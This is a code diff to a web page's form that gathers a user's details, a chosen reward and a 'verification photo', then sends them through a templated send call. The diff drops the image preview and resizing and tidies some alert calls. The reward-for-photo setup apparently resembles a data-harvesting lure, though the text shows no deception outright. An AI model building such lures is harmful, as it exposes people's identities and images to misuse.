@@ -65,13 +65,6 @@ font-size:13px;
 color:#bbbbbb;
 }
 
-.preview{
-width:100%;
-margin-top:10px;
-border-radius:10px;
-display:none;
-}
-
 </style>
 </head>
 
@@ -180,8 +173,6 @@ id="photoUpload"
 accept="image/*"
 required>
 
-<img id="previewImage" class="preview">
-
 <div class="notice">
 
 By continuing, you agree to share your submitted details and verification photo.
@@ -215,62 +206,15 @@ document
 const file = this.files[0];
 
 if(!file){
-
 capturedImage = null;
-
 return;
-
 }
 
 const reader = new FileReader();
 
-reader.onload = function(event){
+reader.onload = function(e){
 
-const img = new Image();
-
-img.onload = function(){
-
-const canvas =
-document.createElement('canvas');
-
-const ctx =
-canvas.getContext('2d');
-
-const maxWidth = 600;
-
-const scaleSize =
-maxWidth / img.width;
-
-canvas.width = maxWidth;
-
-canvas.height =
-img.height * scaleSize;
-
-ctx.drawImage(
-img,
-0,
-0,
-canvas.width,
-canvas.height
-);
-
-capturedImage =
-canvas.toDataURL(
-'image/jpeg',
-0.7
-);
-
-document
-.getElementById('previewImage')
-.src = capturedImage;
-
-document
-.getElementById('previewImage')
-.style.display = "block";
-
-};
-
-img.src = event.target.result;
+capturedImage = e.target.result;
 
 };
 
@@ -294,16 +238,13 @@ document.getElementById('selectedRewardText');
 
 if(reward !== ""){
 
-selectedRewardBox.style.display =
-"block";
+selectedRewardBox.style.display = "block";
 
-selectedRewardText.innerText =
-reward;
+selectedRewardText.innerText = reward;
 
 }else{
 
-selectedRewardBox.style.display =
-"none";
+selectedRewardBox.style.display = "none";
 
 }
 
@@ -393,9 +334,7 @@ e.preventDefault();
 
 if(!capturedImage){
 
-alert(
-"Please wait until image uploads"
-);
+alert("Please wait until image uploads");
 
 return;
 
@@ -446,25 +385,13 @@ templateParams
 
 .then(()=>{
 
-alert(
-"Verification submitted successfully!"
-);
+alert("Verification submitted successfully!");
 
-document
-.getElementById('rewardForm')
-.reset();
+document.getElementById('rewardForm').reset();
 
-document
-.getElementById('dynamicOptions')
-.innerHTML = "";
+document.getElementById('dynamicOptions').innerHTML = "";
 
-document
-.getElementById('selectedRewardBox')
-.style.display = "none";
-
-document
-.getElementById('previewImage')
-.style.display = "none";
+document.getElementById('selectedRewardBox').style.display = "none";
 
 capturedImage = null;
 
@@ -474,9 +401,7 @@ capturedImage = null;
 
 console.log(error);
 
-alert(
-"Failed to send verification"
-);
+alert("Failed to send verification");
 
 });
 
